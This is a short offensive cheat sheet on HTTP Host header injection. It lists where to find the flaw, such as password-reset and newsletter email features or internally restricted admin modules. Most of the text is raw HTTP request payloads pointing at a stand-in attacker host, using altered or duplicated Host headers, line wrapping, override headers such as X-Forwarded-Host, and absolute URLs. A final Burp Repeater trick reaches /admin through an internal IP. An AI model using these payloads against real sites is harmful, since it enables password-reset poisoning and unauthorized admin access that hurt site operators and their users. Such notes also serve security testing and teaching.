# Host Header Injection

## Introduction
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

## Where to find
* In the feature where the website can send email to us. For example forgot password / newsletter.
* Admin module that accept access locally or internal IP.

## Impact
* Bypass Admin Module
* Reset Password Poisoning

## How to exploit
#### Note: evil-website.com can be (127.0.0.1, localhost, Routing-SSRF)
1. Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
2. Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
3. Add line wrapping
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```
4. Add host override headers
```
X-Forwarded-For: evil-website.com
X-Forwarded-Host: evil-website.com
X-Forwarded-Server: evil-website.com
X-Client-IP: evil-website.com
X-Remote-IP: evil-website.com
X-Remote-Addr: evil-website.com
X-Host: evil-website.com

### How to use? In this case im using "X-Forwarded-For : evil.com"
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
5. Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```

6.Burp Repeater "Send group (single connection)" Original+tampering
```
### Request Original:
GET / HTTP/1.1
Host: www.vuln.com
Connection: keep-alive

### Request Tampering:
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive

### Response Tampering:
HTTP/1.1 200 OK
…
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
 ```

## References
* [PortSwigger](https://portswigger.net/web-security/host-header/exploiting)
